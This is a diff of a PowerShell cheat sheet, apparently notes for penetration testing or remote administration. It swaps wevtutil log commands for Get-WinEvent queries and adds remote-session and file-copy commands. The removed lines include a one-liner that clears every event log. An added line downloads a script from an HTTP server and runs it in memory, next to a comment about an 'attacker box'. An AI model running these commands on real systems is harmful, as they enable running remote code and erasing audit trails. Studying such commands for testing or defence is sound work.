@@ -27,13 +27,11 @@ Check PowerShell Logs with PowerShell
 X-----------------------------
 gci HKLM:\software\wow6432node\policies\microsoft\windows\powershell
 
-wevtutil el  # check for powershell logs
-wevtutil gl "Windows Powershell"
-wevtutil sl "Windows Powershell" /ms:1024000
-wevtutil sl "windows Powershell" /rt:true /ab:fales
-wevtutil sl "windows Powershell" /ab:false
+get-winevent -listlog *powershell*
 
-wevtutil el | Foreach-Object {wevtutil cl "$_"}  #clear all logs
+get-winevent -logname Microsoft-Windows-PowerShell/Operational -maxevents 10
+get-winevent -logname "Windows Powershell" -maxevents 10
+
 
 -----------------------------X
 
@@ -64,6 +62,7 @@ X-----------------------------
 $cred = get-credential
 $Option = New-PSSessionOption -IdleTimeout 300000 -nomachineprofile
 $t1 = new-pssession -computer 10.10.100.178 -credential $cred -sessionoption $option
+Invoke-Command -Session $t1 -filepath c:\users\administrator\desktop\test.ps1
 enter-pssession -session $t1
 #Do Stuff
 exit
@@ -95,6 +94,12 @@ stop-transcript
 ### FILE DOWNLOAD OVER HTTP
 (new-object system.net.webclient) .downloadFile("url","dest")
 
+### Download script to memory
+IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1")
+
+### Copy to/from remote system using pssession (requires PowerShell 5 on attcker box
+copy-item "C:\myRemoteData\Scripts" -Destination "C:\mylocaldata\Scripts" -fromSession $s1
+ 
 -----------------------------X
 
 
